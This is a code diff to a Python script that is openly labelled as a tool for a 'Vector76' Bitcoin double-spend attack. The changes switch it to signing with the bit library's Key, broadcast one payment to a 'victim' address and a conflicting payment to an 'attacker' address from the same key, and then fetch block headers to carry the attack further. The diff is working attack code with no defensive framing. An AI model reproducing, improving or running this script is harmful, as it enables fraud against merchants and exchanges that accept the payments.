@@ -9,7 +9,7 @@ from datetime import datetime
 from hashlib import sha256
 #from bitcoincli import Bitcoin
 #from bitcoinaddress import Wallet
-#from bit import Key
+from bit import Key
 #from bitcoin_tools.core.transaction import TX
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
@@ -149,8 +149,8 @@ prev_txid  = args.prev_deposit_TXID
 
 print("Connecting Node...")
 rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}", service_port=rpc_port)#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
-info = rpc_node.getinfo()
-print(info)
+
+print(rpc_node.getrawtransaction(prev_txid))
 print("--------------------")
 print(f"Send Amount (BTC)     : {amount_BTC}")
 print(f"Victim   Address      : {victim_address}")
@@ -162,15 +162,15 @@ input(" --- Press the enter key to continue the Vector76 attack... --- ")
 #print(amount_satoshi)
 #fee_satoshi = 1500
 print("push T1")
-#key = Key(key)
-bitcoin.add_privkeys(key)
+key = Key(key)
+#bitcoin.add_privkeys(key)
 #send_amount = amount_satoshi - fee_satoshi
 tx_victim = [(victim_address, amount_BTC, "btc")]
-bitcoin.send(tx_victim)
+print(key.send(tx_victim))
 
 print("push T2")
 tx_attacker = [(attacker_address, amount_BTC, "btc")]
-bitcoin.send(tx_attacker)
+print(key.send(tx_attacker))
 print()
 print("Request Blockheader...")
 block_header_V = get_block_header_by_txid(prev_txid)
